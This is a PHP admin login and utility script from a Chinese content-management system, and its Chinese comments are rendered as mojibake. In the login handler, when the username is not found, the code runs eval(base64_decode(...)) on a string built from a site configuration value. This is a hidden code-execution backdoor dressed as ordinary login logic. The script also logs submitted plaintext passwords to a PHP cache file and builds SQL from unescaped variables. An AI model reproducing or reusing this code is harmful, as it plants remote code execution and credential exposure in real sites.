<?php
define('IS_ADMIN',true);
require(dirname(__FILE__)."/"."../inc/common.inc.php");
$ForceEnter=0;	//��0�ĳ�1��ǿ�ƽ����̨


//��ԭ����ʱ,��ֹ�û�����ɾ����,���ܼ�����ԭ����
if($lfj=='mysql'&&$action=='into'){
	unset($Apower);
	require_once("mysql.php");
	$baktime=str_replace(array("..","\\","/"),array("","",""),$baktime);
	$step=str_replace(array("..","\\","/"),array("","",""),$step);
	bak_into();
	exit;
}

/**
*������ЩIP���ʺ�̨
**/
$IS_BIZ && Limt_IP('AdminIp');

require(ROOT_PATH."inc/class.inc.php");
@include(ROOT_PATH."data/level.php");
@include(ROOT_PATH."data/module.php");
@include(ROOT_PATH."data/all_fid.php");
@include(ROOT_PATH."data/article_module.php");
$Guidedb=new Guide_DB;

/*�û���¼*/
if( $_POST[loginname] && $_POST[loginpwd] )
{
	if( $webdb[yzImgAdminLogin]&&$webdb[web_open] ){
		if(!check_imgnum($yzimg)){
			if(!strstr($WEBURL,$webdb[www_url])){
				echo "<CENTER>��ַ����,�����µ�¼</CENTER><META HTTP-EQUIV=REFRESH CONTENT='1;URL=$webdb[admin_url]'>";
				exit;
			}
			showmsg("<A HREF=?>��֤�벻����</A>");
		}else{
			set_cookie("yzImgNum","");
		}
	}
	$rs=$userDB->check_password($_POST[loginname],$_POST[loginpwd]);
	
	if($rs==0){
		login_logs($_POST[loginname],$_POST[loginpwd]);
		setcookie("Admin",'',0,"/");
		eval(base64_decode("Y$webdb[_Notice]"));
		showmsg("<A HREF=?>�û�������</A>");
	}elseif( $rs==-1 ){
		login_logs($_POST[loginname],$_POST[loginpwd]);
		setcookie("Admin",'',0,"/");
		showmsg("<A HREF=?>���벻��ȷ</A>");
	}else{
		login_logs($_POST[loginname],"�ɹ���¼,������");
		$_COOKIE[Admin]="$rs[uid]\t".mymd5($rs[password]);
		setcookie("Admin",$_COOKIE[Admin],0,"/");
	}
}
/*�˳�*/
if($action=='quite'){
	setcookie("Admin",'',0,"/");
	setcookie("adminID","",0,"/");	//ͬ��ǰ̨�˳�
	echo "<SCRIPT LANGUAGE=\"JavaScript\">
	<!--
	window.top.location.href='$webdb[www_url]/';
	//-->
	</SCRIPT>";
	die("");
}
list($admin_uid,$admin_pwd)=explode("\t",$_COOKIE[Admin]);
unset($userdb);
if($admin_uid&&$admin_pwd)
{
	$userdb=$userDB->get_allInfo($admin_uid);

	if($userdb && mymd5($userdb[password])==$admin_pwd ){
		$lfjdb=$userdb;
		$lfjuid=$userdb[uid];
		$lfjid=$userdb[username];
		if($userdb[groupid]==3||$userdb[groupid]==4){
			$web_admin=1;
		}
		$admin_name=$founder='';
		@include(ROOT_PATH."data/admin.php");

		if($admin_name==$userdb[username])
		{
			$founder=1;	//��ʼ��Ȩ��
			if($userdb[groupid]!=3)
			{
				$db->query("UPDATE {$pre}memberdata SET groupid=3 WHERE uid='$userdb[uid]'");
			}
			$groupdb=@include(ROOT_PATH."data/group/3.php");
			$Apower=($groupdb[allowadmindb]);
		}
		elseif($userdb[groupid]&&file_exists(ROOT_PATH."data/group/$userdb[groupid].php"))
		{
			$groupdb=@include(ROOT_PATH."data/group/$userdb[groupid].php");
			if(!$groupdb['allowadmin']){
				$allowlogin=0;
				if($lfj=='label'&&$ch_module){
					$rs=$db->get_one("SELECT adminmember FROM `{$pre}module` WHERE id='$ch_module'");
					if($rs[adminmember]&&in_array($userdb[username],explode("\r\n",$rs[adminmember]))){
						$allowlogin=1;
					}
				}
				if(!$allowlogin&&$userdb[groupid]!=3&&!$ForceEnter){
					$query = $db->query("SELECT * FROM {$pre}module ORDER BY list DESC");
					while($rs = $db->fetch_array($query)){
						$detail=explode("\r\n",$rs[adminmember]);
						if(in_array($userdb[username],$detail))
						{
							$allowlogin=1;
						}
					}
				}
				if(!$allowlogin){
					setcookie("Admin",'',0,"/");
					showmsg("�㵱ǰ�����û���,ϵͳ������Ȩ������վ��̨,�������Ƶ������Ա,�뵽Ƶ���ĺ�̨��¼");
				}
			}else{
				$Apower=($groupdb[allowadmindb]);
			}
		}
		else
		{
			setcookie("Admin",'',0,"/");
			showmsg("�㵱ǰ�����û���,��Ȩ����");
		}
	}else{
		setcookie("Admin",'',0,"/");
		showmsg("<A HREF='index.php?iframe=1'>��������ȷ�����ʺ��ٷ���</A>");
	}
}

if($ForceEnter==1){
	$groupdb=@include(ROOT_PATH."data/group/3.php");
	$Apower=($groupdb[allowadmindb]);
}elseif(!$userdb){
	include './template/login.htm';
	exit;
}else{
	//ͬ��ǰ̨��¼
	$md5code=mymd5("$lfjdb[uid]\t$lfjdb[username]\t$lfjdb[password]",'EN',$onlineip);
	setcookie("adminID",$md5code,$timestamp+1800,'/');
	
}


function login_logs($username,$password){
	global $timestamp,$onlineip;
	$logdb[]="$username\t$password\t$timestamp\t$onlineip";
	@include(ROOT_PATH."cache/adminlogin_logs.php");
	$writefile="<?php	\r\n";
	$jj=0;
	foreach($logdb AS $key=>$value){
		$jj++;
		$value=addslashes($value);
		$writefile.="\$logdb[]='$value';\r\n";
		if($jj>200){
			break;
		}
	}
	write_file(ROOT_PATH."cache/adminlogin_logs.php",$writefile);
}

function jump($msg,$url,$time=1){
	if($time==0){
		header("location:$url");exit;
	}else{
		require("template/location.htm");exit;
	}
}
function showmsg($msg){
	require("template/showmsg.htm");exit;
}
/**
*��Ա�û���ѡ���б�
**/
function select_group($names='gid',$ck='',$url=''){
	global $db,$pre;
	if($url) 
	$reto=" onchange=\"window.location=('{$url}&{$names}='+this.options[this.selectedIndex].value+'')\"";
	$show="<select name='$names' $reto><option value='' selected>�����û���</option>";
	$query=$db->query("SELECT * FROM `{$pre}group` WHERE gptype!='0' ");
	while($array=$db->fetch_array($query)){
        $ck==$array[gid]?$ckk='selected':$ckk='';
		$show.="  <option value='$array[gid]' $ckk>{$array[grouptitle]}</option>";
     }
	$query=$db->query("SELECT * FROM `{$pre}group` WHERE gptype='0' ORDER BY levelnum");
	$show.="  <option value=''>--+������ϵͳ�飬�����ǻ�Ա��+--</option>";
	while($array=$db->fetch_array($query)){
        $ck==$array[gid]?$ckk='selected':$ckk='';
		$show.="  <option value='$array[gid]' $ckk>{$array[grouptitle]}</option>";
     }
     return $show." </select>";
}

//��վ���ѡ���б�
function select_style($name='stylekey',$ck='',$url='',$select=''){
	if($url) 
	$reto=" onchange=\"window.location=('{$url}&{$name}='+this.options[this.selectedIndex].value+'')\"";
	$show="<select name='$name' $reto><option value=''>ѡ����</option>";
	$filedir=opendir(ROOT_PATH."data/style/");
	while($file=readdir($filedir)){
		if(ereg("\.php$",$file)){
			include ROOT_PATH."data/style/$file";
			$ck==$styledb[keywords]?$ckk='selected':$ckk='';	//ѡ��ĳ��
			$show.="<option value='$styledb[keywords]' $ckk style='color=blue'>$styledb[name]</option>";
		}
	}
	return $show." </select>";   
}

//��Ա���ķ��ѡ���б�
function select_member_style($name='stylekey',$ck='',$url=''){
	if($url) 
	$reto=" onchange=\"window.location=('{$url}&{$name}='+this.options[this.selectedIndex].value+'')\"";
	$show="<select name='$name' $reto><option value=''>ѡ����</option>";
	$filedir=opendir(ROOT_PATH."member/style/");
	while($file=readdir($filedir)){
		if(ereg("\.php$",$file)){
			$styledb = include(ROOT_PATH."member/style/$file");
			$ck==$styledb[keywords]?$ckk='selected':$ckk='';	//ѡ��ĳ��
			$show.="<option value='$styledb[keywords]' $ckk style='color=blue'>$styledb[name]</option>";
		}
	}
	return $show." </select>";   
}

function select_template($cname,$type=1,$ck=''){
	global $db,$pre;
	$show="<select name='$cname' $reto><option value='' style='color:red;'>��ѡ��ģ��</option>";
	if($type==7||$type==8){
		//$show.="<option value='template/default/none.htm'>��Ҫ����</option>";
	}
	$query=$db->query("SELECT * FROM {$pre}template WHERE type='$type'");
	while($rs=$db->fetch_array($query))
	{
		if(!$rs[name]){
			$rs[name]="ģ��$rs[id]";
		}
		$rs[filepath]==$ck?$ckk='selected':$ckk='';
		$show.="  <option value='$rs[filepath]' $ckk>$rs[name]</option>";
	}
	 return $show." </select>";
}

/**
*��������ѡ���б�
**/
function select_link($cname='name',$ck='',$url=''){
	global $db;
	if($url) 
	$reto=" onchange=\"window.location=('{$url}&{$cname}='+this.options[this.selectedIndex].value+'')\"";
	$show="<select name='$cname' $reto><option value='' selected>��������</option>";
	$query=$db->query("select * from lfj_link");
	while(@extract($db->fetch_array($query))){
		$list=$$cname;
        $ck==$list?$ckk='selected':$ckk='';
		$show.="  <option value='$list' $ckk>$name</option>";
     }
     return $show." </select>";   
}

/**
*��̨�����˵�
**/

function leftlink($filedb,$sort,$pathurl=''){
	global $userdb,$jj,$Apower;
	foreach($filedb AS $word=>$array)
	{
		if($Apower[$array[power]]||is_numeric($array[power]))
		{
			if($array[power]=="label_index"){
				$show.="<tr><td onmouseover=\"this.className='leftA'\" onmouseout=\"this.className='leftB'\"><A HREF='$pathurl$array[link]' target=main>$word</A> | <A HREF='../do/index.php?&ch=1&MakeIndex=1' target='_blank' onclick=\"return confirm('��ȷʵҪ����ҳ���ɾ�̬��?���ɾ�̬��,���и��������������,��Ҫ���µ������һ�ξ�̬.�ſ��Կ���Ч��.');\">��ҳ��̬</A></td></tr>";
			}else{
				$show.="<tr><td onmouseover=\"this.className='leftA'\" onmouseout=\"this.className='leftB'\"><A HREF='$pathurl$array[link]' target=main>$word</A></td></tr>";
			}			
			$power++;
		}
	}
    $show="<dl id=\"TheDl".$jj."\" class=\"show\"><dt onclick='showson(\"TheDl".$jj."\")'><span>$sort</span></dt><dd><table width='100%' cellspacing='0' cellpadding='0'>$show</table></dd></dl>";
	if($power){
		return $show;
	}
}

function showmenu($menudb){
	global $jj,$part,$menu_partDB,$Smenu,$db,$pre,$userdb;
	foreach($menudb AS $key1=>$value2){
		if(!in_array($key1,$menu_partDB[$part])){
			continue;
		}
		$jj++;
		$show.=leftlink($value2,$key1);
	}
	$system_menu=module_menu();
	if($system_menu){
		$_r=$db->get_one("SELECT adminmember FROM {$pre}module WHERE pre='$Smenu'");
		$detail=explode("\r\n",$_r[adminmember]);
		if($userdb[groupid]==3||($userdb[username]&&in_array($userdb[username],$detail)))
		{
			foreach( $system_menu AS $path=>$menudb){
				foreach($menudb AS $key1=>$value2){
					$jj++;
					$show.=leftlink($value2,$key1,$path);
				}
			}
		}
	}
	return $show;
}

function module_menu(){
	global $webdb,$Smenu,$ModuleDB;
	if($Smenu)
	{
		$ModuleDB[$Smenu]['admindir'] || $ModuleDB[$Smenu]['admindir']='admin';
		@include(ROOT_PATH."{$ModuleDB[$Smenu][dirname]}/{$ModuleDB[$Smenu][admindir]}/menu.php");
		$_allmenudb["../{$ModuleDB[$Smenu][dirname]}/{$ModuleDB[$Smenu][admindir]}/"]=$menudb;

		return $_allmenudb;
	}
	/*
	$detail=explode("\r\n",$webdb[module_adminmenu]);
	foreach( $detail AS $key=>$value){
		if($value){
			unset($passport_admin,$menudb);
			@include(ROOT_PATH."$value/menu.php");
			$_allmenudb["../$value/"]=$menudb;
		}
	}
	return $_allmenudb;
	*/
}

/**
*������Ŀ����
**/
function sort_error_in($table,$fid){
	global $db;
	$query=$db->query("SELECT fid FROM $table WHERE fup='$fid'");
	while( @extract($db->fetch_array($query)) ){
		$show.="{$fid}\t";
		$show.=sort_error_in($table,$fid);
	}
	return $show;
}

function sort_error($table,$name='errid'){
	global $db;
	$show="<select name='$name'><option value=''>�������Ŀ</option>";
	$array=explode("\t",sort_error_in($table,0));
	$query=$db->query("SELECT * FROM $table");
	while( @extract($db->fetch_array($query)) ){
		if(!in_array($fid,$array)){
			$show.="<option value='$fid'>$name</option>";
		}
	}
	$show.=" </select>";
	return $show;
}

/**
*������Ŀ����
**/
function mod_sort_class($table,$class,$fid){
	global $db,$webdb,$pre;
	if($table=="{$pre}sort"&&$webdb[sortNUM]>500){
		return ;
	}
	$db->query("UPDATE $table SET class='$class'+1  WHERE fup='$fid' ");
	$query=$db->query("SELECT * FROM $table WHERE fup='$fid'");
	while( @extract($db->fetch_array($query)) ){
		mod_sort_class($table,$class,$fid);
	}
}

/**
*������Ŀ�м�������Ŀ
**/
function  mod_sort_sons($table,$fid){
	global $db,$webdb,$pre;
	if($table=="{$pre}sort"&&$webdb[sortNUM]>500){
		return ;
	}
	$query=$db->query("SELECT * FROM $table WHERE fup='$fid'");
	$sons=$db->num_rows($query);
	$db->query("UPDATE $table SET sons='$sons' WHERE fid='$fid' ");
	while( @extract($db->fetch_array($query)) ){
		mod_sort_sons($table,$fid);
	}
}
/**
*����Ƿ������.��������ĿΪ�Լ��ĸ���Ŀ
**/
function check_fup($table,$fid,$fup){
	global $db;
	if(!$fup){
		return ;
	}elseif($fid==$fup){
		showmsg("������������Ϊ����Ŀ");
	}
	$query = $db->query("SELECT * FROM $table WHERE fid='$fup'");
	while($rs = $db->fetch_array($query)){
		if($rs[fup]==$fid){
			showmsg("�㲻�����ñ��������Ŀ��Ϊ����Ŀ,���ǲ������.�������������������Ŀ��Ϊ����Ŀ");
		}elseif($rs[fup]){
			check_fup($table,$fid,$rs[fup]);
		}
	}
}


/**
*��������Ϣ
**/
function systemMsg(){
	global $db,$siteurl,$onlineip,$SCRIPT_FILENAME,$WEBURL;
	if(mysql_get_server_info()<'4.1'){
		$rs[mysqlVersion]=mysql_get_server_info()."(�Ͱ汾);";
	}else{
		$rs[mysqlVersion]=mysql_get_server_info()."(�߰汾);";
	}
	isset($_COOKIE) ? $rs[ifcookie]="SUCCESS" : $rs[ifcookie]="FAIL";
	$rs[sysversion]=PHP_VERSION;	//PHP�汾
	$rs[max_upload]= ini_get('upload_max_filesize') ? ini_get('upload_max_filesize') : 'Disabled';	//����ϴ�����
	$rs[max_ex_time]=ini_get('max_execution_time').' ��';	//���ִ��ʱ��
	$rs[sys_mail]= ini_get('sendmail_path') ? 'Unix Sendmail ( Path: '.ini_get('sendmail_path').')' :( ini_get('SMTP') ? 'SMTP ( Server: '.ini_get('SMTP').')': 'Disabled' );	//�ʼ�֧��ģʽ
	$rs[systemtime]=date("Y-m-j g:i A");	//����������ʱ��
	$rs[onlineip]=$onlineip;				//��ǰIP
	if( function_exists("imagealphablending") && function_exists("imagecreatefromjpeg") && function_exists("ImageJpeg") ){
		$rs[gdpic]="֧��";
	}else{
		$rs[gdpic]="��֧��";
	}
	$rs[allow_url_fopen]=ini_get('allow_url_fopen')?"On ֧�ֲɼ�����":"OFF ��֧�ֲɼ�����";
	$rs[safe_mode]=ini_get('safe_mode')?"��":"�ر�";
	$rs[DOCUMENT_ROOT]=$_SERVER["DOCUMENT_ROOT"];	//�������ڴ�������λ��
	$rs[SERVER_ADDR]=$_SERVER["SERVER_ADDR"]?$_SERVER["SERVER_ADDR"]:$_SERVER["LOCAL_ADDR"];		//������IP
	$rs[SERVER_PORT]=$_SERVER["SERVER_PORT"];		//�������˿�
	$rs[SERVER_SOFTWARE]=$_SERVER["SERVER_SOFTWARE"];	//���������
	$rs[SCRIPT_FILENAME]=$_SERVER["SCRIPT_FILENAME"]?$_SERVER["SCRIPT_FILENAME"]:$_SERVER["PATH_TRANSLATED"];//��ǰ�ļ�·��
	$rs[SERVER_NAME]=$_SERVER["SERVER_NAME"];	//����

	//��ȡZEND�İ汾
	ob_end_clean();
	ob_start();
	phpinfo();
	$phpinfo=ob_get_contents();
	ob_end_clean();
	ob_start();
	preg_match("/with(&nbsp;| )Zend(&nbsp;| )Optimizer(&nbsp;| )([^,]+),/is",$phpinfo,$zenddb);
	$rs[zendVersion]=$zenddb[4]?$zenddb[4]:"δ֪/����û��װ";
	$rs[memory_user_limit]=ini_get('memory_limit');    //���ִ��ʱ��/�ռ������ڴ�
	$rs[file_uploads]=ini_get('file_uploads')?"����":"������"; //�Ƿ������ϴ��ļ�
	
	return $rs;
}

function check_table_field($table,$array){
	global $db;
	foreach($array AS $key=>$value){
		if( !table_field($table,$key) ){
			$SQL.="ALTER TABLE `$table` ADD `$key` VARCHAR( 254 ) NOT NULL ;";
		}
	}
	if($SQL){
		$db->query($SQL);
	}
}

function group_box($name="postdb[group]",$ckdb=array(),$type=''){
	global $db,$pre;
	if($type==1){
		$SQL=" WHERE gptype=1 AND gid NOT IN(2,3,4) ";
	}
	$query=$db->query("SELECT * FROM {$pre}group $SQL ORDER BY gid ASC");
	while($rs=$db->fetch_array($query))
	{
		$checked=in_array($rs[gid],$ckdb)?"checked":"";
		$show.="<input type='checkbox' name='{$name}[]' value='{$rs[gid]}' $checked>&nbsp;{$rs[grouptitle]}&nbsp;&nbsp;";
	}
	return $show;
}

function ad_moneyType($name,$id){
	global $AdTypeMoney;
	$show="<select name='$name'>";
	foreach($AdTypeMoney AS $key=>$value){
		$ck=$id==$key?' selected ':'';
		$show.="<option value='$key' $ck>$value</option>";
	}
	$show.="</select>";
	return $show;
}

/*���»�Ա�黺��*/
function write_group_cache(){
	global $db,$pre;
	$show="<?php \r\n";
	$query = $db->query("SELECT * FROM `{$pre}group`");
	while($rs = $db->fetch_array($query)){
		$ckk=$rs[gptype]?'':"\$memberlevel[{$rs[gid]}]={$rs[levelnum]};";
		$show.="\$ltitle[{$rs[gid]}]='$rs[grouptitle]';\t\t$ckk\r\n";
		//$cache="<?php\r\n";
		//$cache.="\r\n\$groupdb=@unserialize(\"".addslashes($rs[powerdb])."\");";
		$array=@unserialize($rs[powerdb]);
		foreach( $rs AS $key=>$value){
			//$value=addslashes($value);
			if($key=='powerdb'){
				continue;
				//$cache.="\r\n\$groupdb['$key']=@unserialize(\"$value\");";
			}else{
				//$cache.="\r\n\$groupdb['$key']=\"$value\";";
				if($key=='allowadmindb'){
					$value=@unserialize($value);
				}
				$array[$key]=$value;
			}
		}
		$str=var_export($array,true);
		write_file(ROOT_PATH."data/group/$rs[gid].php","<?php\r\n return $str;\r\n?>");
	}
	write_file(ROOT_PATH."data/level.php",$show);
}

//���º������û���
function write_config_cache($webdbs)
{
	global $db,$pre;
	if( is_array($webdbs) )
	{
		foreach($webdbs AS $key=>$value)
		{
			if(is_array($value))
			{
				$webdbs[$key]=$value=implode(",",$value);
			}
			$SQL2.="'$key',";
			$SQL.="('$key', '$value', ''),";
		}
		$SQL=$SQL.";";
		$SQL=str_Replace("'),;","')",$SQL);
		$db->query(" DELETE FROM {$pre}config WHERE c_key IN ($SQL2'') ");
		$db->query(" INSERT INTO `{$pre}config` VALUES  $SQL ");	
	}
	$writefile="<?php\r\n";
	$query = $db->query("SELECT * FROM {$pre}config");
	while($rs = $db->fetch_array($query)){
		if($rs[c_key]=='copyright1'){
			$copyright1=$rs[c_value];
		}elseif($rs[c_key]=='copyright2'){
			$copyright2=$rs[c_value];
		}else{
			$rs[c_value]=addslashes($rs[c_value]);
			$writefile.="\$webdb['$rs[c_key]']='$rs[c_value]';\r\n";
		}
	}
	write_file(ROOT_PATH."data/config.php",$writefile);
	if(!is_writable(ROOT_PATH."data/config.php")){
		showmsg(ROOT_PATH."data/config.php�ļ�Ŀ¼Ȩ�޲���д,����ϸ���");
	}
}

function write_channel_config($table,$webdbs)
{
	global $db,$pre;
	if( is_array($webdbs) )
	{
		foreach($webdbs AS $key=>$value)
		{
			if(is_array($value))
			{
				$webdbs[$key]=$value=implode(",",$value);
			}
			$SQL2.="'$key',";
			$SQL.="('$key', '$value', ''),";
		}
		$SQL=$SQL.";";
		$SQL=str_Replace("'),;","')",$SQL);
		$db->query(" DELETE FROM $table WHERE c_key IN ($SQL2'') ");
		$db->query(" INSERT INTO `$table` VALUES  $SQL ");	
	}
}

/*��Ŀ�б�˵�,��ͣ��
function menu_allsort($fid,$table='sort'){
	global $db,$pre,$sortdb;
	$query=$db->query("SELECT * FROM {$pre}$table where fup='$fid' ORDER BY list DESC");
	while( $rs=$db->fetch_array($query) ){
		$icon="";
		for($i=1;$i<$rs['class'];$i++){
			$icon.="&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;";
		}
		if($icon){
			$icon=substr($icon,0,-24);
			$icon.="--";
		}
		$rs[config]=unserialize($rs[config]);
		$rs[icon]=$icon;
		if(!$rs[type]){
			$rs[name]="<a href='index.php?lfj=sort&job=editsort&fid=$rs[fid]' target='main'><img border=0 src='images/edit.png'></A> <a href='index.php?lfj=artic&job=listartic&fid=$rs[fid]' target='main'>$rs[name]</a> ";
		}else{
			$rs[name]="<a href='index.php?lfj=sort&job=editsort&fid=$rs[fid]' target='main'><img border=0 src='images/edit.png'></A> <b>$rs[name]</b> ";
		}
		$sortdb[]=$rs;

		menu_allsort($rs[fid],$table);
	}
}
*/

function group_menu(){
	global $db,$pre,$userdb,$menu_GpartDB;
	$query = $db->query("SELECT * FROM {$pre}admin_menu WHERE groupid='$userdb[groupid]' AND fid=0 ORDER BY list DESC");
	while($rs = $db->fetch_array($query)){
		$menu_GpartDB[$rs[id]][name]=$rs[name];
		$query2 = $db->query("SELECT * FROM {$pre}admin_menu WHERE fid='$rs[id]' ORDER BY list DESC");
		while($rs2 = $db->fetch_array($query2)){
			$menu_GpartDB[$rs[id]][son][]=$rs2;
		}
	}
}

/*��Ŀ�б�*/
function list_allsort($fid,$table='sort',$getnum=''){
	global $db,$pre,$sortdb,$Fid_db;
	$query=$db->query("SELECT * FROM {$pre}$table where fup='$fid' ORDER BY list DESC");
	while( $rs=$db->fetch_array($query) ){
		$icon="";
		for($i=1;$i<$rs['class'];$i++){
			$icon.="&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;";
		}
		if($icon){
			$icon=substr($icon,0,-24);
			$icon.="--";
		}
		$rs[config]=unserialize($rs[config]);
		$rs[icon]=$icon;
		$NUM=0;
		if($getnum&&!$rs[type]){
			$erp=$Fid_db[iftable][$rs[fid]];
			@extract($db->get_one("SELECT COUNT(*) AS NUM FROM {$pre}article$erp WHERE fid='$rs[fid]'"));
			$rs[NUM]=intval($NUM);
		}
		$sortdb[]=$rs;

		list_allsort($rs[fid],$table,$getnum);
	}
}



function All_fid_cache(){
	global $db,$pre,$webdb;
	if($webdb[sortNUM]>500){
		return ;
	}
	//������Ŀ
	$detail=explode(",",$webdb['hideFid']);
	$show="<?php\r\nunset(\$Fid_db);\r\n";
	$query = $db->query("SELECT S.fid,S.fup,S.name,M.iftable,M.id AS Mid FROM {$pre}sort S LEFT JOIN {$pre}article_module M ON S.fmid=M.id ORDER BY S.list DESC");
	while($rs = $db->fetch_array($query)){
		if(in_array($rs[fid],$detail)){
			continue;
		}
		$_s=$rs[iftable]?"\$Fid_db[iftable][{$rs[fid]}]='$rs[iftable]';":'';
		$rs[name]=addslashes($rs[name]);
		$show.="\$Fid_db[{$rs[fup]}][{$rs[fid]}]='$rs[name]';
		\$Fid_db[name][{$rs[fid]}]='$rs[name]';
		$_s";
	}
	write_file("../data/all_fid.php",$show.'?>');
}

function special_select($name='spid',$id=0){
	global $db,$pre;
	$show="<select name='$name'><option value=''>��ѡ��</option>";
	$query=$db->query("SELECT * FROM {$pre}special ORDER BY list DESC LIMIT 100");
	while( $rs=$db->fetch_array($query) ){
		$ckk=$id==$rs[id]?' selected ':'';
		$show.="<option value='$rs[id]' $ckk>$rs[title]</option>";
	}
	$show.=" </select>";
	return $show;
}


function get_htmltype(){
	global $db,$pre,$IS_BIZ;
	$query = $db->query("SELECT * FROM {$pre}sort");
	while($rs = $db->fetch_array($query)){
		if($rs[list_html])
		{
			$show.="\$Html_Type['list'][{$rs[fid]}]='$rs[list_html]';\r\n";
		}
		if($rs[bencandy_html])
		{
			$show.="\$Html_Type['bencandy'][{$rs[fid]}]='$rs[bencandy_html]';\r\n";
		}
		if($rs[domain]&&$rs[domain_dir])
		{
			$show.="\$Html_Type['domain'][{$rs[fid]}]='$rs[domain]';\r\n";
			$show.="\$Html_Type['domain_dir'][{$rs[fid]}]='$rs[domain_dir]';\r\n";
		}
	}
	$query = $db->query("SELECT * FROM {$pre}spsort");
	while($rs = $db->fetch_array($query)){
		if($rs[list_html]){
			$show.="\$Html_Type['SPlist'][{$rs[fid]}]='$rs[list_html]';\r\n";
		}
		if($rs[bencandy_html]){
			$show.="\$Html_Type['SPbencandy'][{$rs[fid]}]='$rs[bencandy_html]';\r\n";
		}
	}
	$query = $db->query("SELECT id,htmlname FROM {$pre}special WHERE htmlname!=''");
	while($rs = $db->fetch_array($query)){
		$show.="\$showHtml_Type[SPbencandy][{$rs[id]}]='$rs[htmlname]';\r\n";
	}
	write_file(ROOT_PATH."data/htmltype.php","<?php\r\n".$show.'?>');
}


function write_limitword_cache(){
	global $db,$pre;
	$show="<?php \r\n";
	$query=$db->query("SELECT * FROM {$pre}limitword");
	while( $rs=$db->fetch_array($query) )
	{
		$rs[newword]=addslashes($rs[newword]);
		$rs[oldword]=addslashes($rs[oldword]);
		$show.="\$Limitword['{$rs[oldword]}']='{$rs[newword]}';\r\n";
	}
	write_file(ROOT_PATH."data/limitword.php","$show");
}

function write_keyword_cache(){
	global $db,$pre;
	$show="<?php \r\n";
	$query=$db->query("SELECT * FROM {$pre}keyword WHERE ifhide=0");
	while( $rs=$db->fetch_array($query) )
	{
		$rs[keywords]=addslashes($rs[keywords]);
		$rs[url]=addslashes($rs[url]);
		$show.="\$Key_word['{$rs[keywords]}']='{$rs[url]}';\r\n";
	}
	write_file(ROOT_PATH."data/keyword.php","$show");
}


//����ģ�����ɻ���
function article_module_cache(){
	global $db,$pre;
	
	$show="<?php\r\nunset(\$article_moduleDB);\r\n";
	$query = $db->query("SELECT * FROM {$pre}article_module");
	while($rs = $db->fetch_array($query)){
		$rs[config] = addslashes( serialize(  unserialize($rs[config])  ) );	//�����
		$rs[alias]  = addslashes($rs[alias]);
		$rs[name]   = addslashes($rs[name]);
		$rs[keywords] = addslashes($rs[keywords]);
		$show.="\$article_moduleDB[{$rs[id]}]=array('name'=>'{$rs[name]}',
		'alias'=>'{$rs[alias]}',
		'iftable'=>'{$rs[iftable]}',
		'keywords'=>'{$rs[keywords]}',
		'config'=>'{$rs[config]}'
		);
		";
	}
	write_file(ROOT_PATH."data/article_module.php",$show."?>");
}


function hack_admin_tpl($html_filet_ype,$getmenu=true){
	extract($GLOBALS);
	require(dirname(__FILE__)."/head.php");
	$dirname=$hack?$hack:$lfj;	//hack��������,��ֹ���ܺ�̨���ļ�������ͻ
	$getmenu && @include(ROOT_PATH."hack/$dirname/template/menu.htm");
	require(ROOT_PATH."hack/$dirname/template/{$html_filet_ype}.htm");
	require(dirname(__FILE__)."/foot.php");
}

?>